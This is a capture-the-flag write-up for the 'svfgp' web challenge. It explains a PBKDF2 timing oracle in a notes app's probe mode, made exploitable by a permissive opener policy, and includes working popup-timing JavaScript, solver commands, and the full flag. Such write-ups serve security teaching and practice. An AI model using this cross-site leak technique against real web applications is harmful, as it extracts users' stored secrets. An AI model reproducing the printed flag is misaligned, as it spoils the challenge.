# SVFGP — Writeup

## Challenge

- **Name:** svfgp
- **Type:** Web / XS-Leak
- **URLs:** `https://svfgp.breakable.live/` (app), `https://svfgp-bot.breakable.live/` (admin bot)
- **Flag:** `CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658}`

---

## Summary

The challenge was a "local-first encrypted notes" web app where an admin bot stores the flag as a sealed note in `localStorage` and then visits an attacker-supplied URL for 60 seconds. I discovered that the app's probe mode creates a timing side-channel: when the query parameter `q` is a valid prefix of the flag, it runs a 3-million-iteration PBKDF2 derivation (~1–3 seconds), but returns almost instantly otherwise. Since COOP was set to `unsafe-none`, a popup opened from my exploit page could send `postMessage` back, letting me measure the delay. The flag content was a SHA-256 hex hash, so only 16 candidate characters per position needed testing. I served an exploit page via Cloudflare tunnel that opened popups to the probe endpoint for each candidate character, timed the responses, and exfiltrated results to a Pipedream webhook. Each 60-second bot visit yielded ~15 characters, so the full 64-character hash plus wrapper was extracted across 4 bot submissions.

---

## Overview

A "local-first encrypted notes" app stores notes in `localStorage`. An admin bot visits a user-supplied URL after placing the flag as a **sealed** note in the app's `localStorage`. The goal is to exfiltrate the flag from the bot's browser.

## Source Analysis

Reviewing the application source (obtained from the challenge or by inspecting the live site):

```bash
# Inspect the app's JavaScript in a browser
curl -s https://svfgp.breakable.live/static/app.js | head -80

# Check response headers for security policies
curl -sI https://svfgp.breakable.live/ | grep -iE 'coop|csp|cors'
# Cross-Origin-Opener-Policy: unsafe-none
# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

### App (`app.py` + `static/app.js`)

The app has two modes controlled by the `mode` query parameter:

1. **View mode** — Create, search, and share notes. Notes are stored in `localStorage` under `svfgp.notes.v1`. Sealed notes have their content hidden in the UI.

2. **Probe mode** — The critical vulnerability:

```javascript
async function runProbeMode() {
    const candidate = boot.q || param("q");
    const secret = loadSecret();  // reads the sealed note's content (= flag)

    if (secret && candidate && secret.startsWith(candidate)) {
        await deriveHash(secret);  // PBKDF2, 3 million iterations — SLOW (~1-3s)
    }

    window.opener.postMessage({ type: "svfgp-probe-done", sid, rid }, "*");
}
```

If the query parameter `q` is a **prefix** of the flag, the app performs an expensive PBKDF2 key derivation (3M iterations of SHA-256). If `q` is not a prefix, it skips straight to `postMessage`. This creates a **timing side-channel**.

### Security Headers

```bash
curl -sI https://svfgp.breakable.live/ | grep -iE 'coop|csp'
# Cross-Origin-Opener-Policy: unsafe-none
# Content-Security-Policy: default-src 'self'; script-src 'self'; ...
```

- **COOP `unsafe-none`** is the key enabler — it allows `window.opener` to remain accessible cross-origin, so a popup opened from our attacker page can send `postMessage` back to us.
- CSP is strict but irrelevant since our exploit page runs on a different origin.

### Bot (`bot.js`)

```javascript
await page.goto(CHALLENGE_ORIGIN, { waitUntil: "domcontentloaded" });
await page.evaluate((flag) => {
    localStorage.setItem("svfgp.notes.v1", JSON.stringify([{
        id: "sealed-0", title: "classified", content: flag, sealed: true
    }]));
}, FIXED_FLAG);

await page.goto(url, { waitUntil: "domcontentloaded" });  // visits our URL
await sleep(60_000);  // stays for 60 seconds
```

The bot sets the flag in localStorage, then visits our attacker URL for 60 seconds. It uses `--disable-popup-blocking` so `window.open()` works.

## Vulnerability: PBKDF2 Timing Oracle

The probe mode creates a boolean timing oracle:
- **Correct prefix** → PBKDF2 runs → response in ~1-3 seconds
- **Wrong prefix** → no PBKDF2 → response in ~150-250ms

By measuring the time between opening a popup and receiving the `postMessage` response, we can determine character-by-character whether a candidate is a valid prefix of the flag.

## Exploit

### Architecture

1. **Attacker page** (served via Cloudflare tunnel) — opens popups to the challenge in probe mode, measures timing via `postMessage`
2. **Pipedream webhook** — receives exfiltrated timing data reliably
3. **Admin bot** — visits our attacker page, which has cross-origin access to challenge popups

### Attack Flow

```
Attacker Page                    Challenge (probe mode)
    |                                   |
    |-- window.open(/?mode=probe&q=X) ->|
    |   start timer                     |
    |                                   |-- if flag.startsWith(X):
    |                                   |     PBKDF2 3M iterations (~2s)
    |                                   |-- else: skip
    |                                   |
    |<-- postMessage("svfgp-probe-done")|
    |   stop timer                      |
    |                                   |
    |-- if elapsed > threshold: X is correct prefix
```

### Key Optimization: SHA256 Charset

The flag content is a SHA256 hash (64 hex chars), so the charset is only `0123456789abcdef` — 16 characters instead of 65+. This means each position takes ~3 seconds to scan (16 × ~200ms), yielding ~15 characters per 60-second bot visit.

### Exploit Code (core logic)

```javascript
const HEX = "0123456789abcdef";

function probe(candidate) {
    return new Promise((resolve) => {
        const rid = Math.random().toString(36).slice(2, 14);
        const url = CHALLENGE + "/?mode=probe&q=" + encodeURIComponent(candidate) +
                    "&rid=" + rid + "&sid=x";
        const start = performance.now();

        function handler(ev) {
            if (ev.data?.type === "svfgp-probe-done" && ev.data.rid === rid) {
                window.removeEventListener("message", handler);
                w.close();
                resolve(performance.now() - start);
            }
        }
        window.addEventListener("message", handler);
        const w = window.open(url, "_blank");
    });
}

// For each position, scan all 16 hex chars
// The one with timing >> median is the correct next character
for (const ch of HEX) {
    const t = await probe(currentPrefix + ch);
    if (t > median * 2 && t > baseline * 1.8) {
        currentPrefix += ch;  // found it
        break;
    }
}
```

### Detection Heuristic

- **Calibrate** baseline by probing definitely-wrong prefixes (e.g., `ZZZZ_NO`)
- For each candidate, if `timing > median * 2` AND `timing > baseline * 1.8`, it's the PBKDF2 signal
- Typical ratios observed: 3x–7x above median

### Iterative Extraction

Since we can only extract ~15 chars per 60-second bot visit, we needed multiple submissions:

| Run | Chars Found | Prefix Length |
|-----|-------------|---------------|
| 1   | 8 chars     | 27/64         |
| 2   | 11 chars    | 38/64         |
| 3   | 16 chars    | 54/64 (with overlap confirmation) |
| 4   | 10 chars    | 64/64 + `}`   |

Between runs, the exploit server was restarted with the updated known prefix:

```bash
# Run 2 — resume from where run 1 left off
export PREFIX="CTF{1390e7327d4c2069a97e3a7f1"
python3 solver.py 8888

# Run 3
export PREFIX="CTF{1390e7327d4c2069a97e3a7f1eafed37e38"
python3 solver.py 8888

# Run 4
export PREFIX="CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455d"
python3 solver.py 8888
```

Pipedream webhook provided reliable exfiltration independent of the tunnel's stability.

Checking exfiltrated results:

```bash
# View collected timings from the local server log endpoint
curl http://localhost:8888/log
```

## Tools Used

- **Cloudflare Quick Tunnel** (`cloudflared`) — expose local exploit server to the internet
- **Pipedream webhook** — reliable exfiltration endpoint
- **Python `http.server`** — serve the exploit HTML page

Installation (if needed):

```bash
# Install cloudflared
curl -L https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -o cloudflared
chmod +x cloudflared
```

## Flag

```
CTF{1390e7327d4c2069a97e3a7f1eafed37e389f9fb9598b183455dc9f6cc2da658}
```
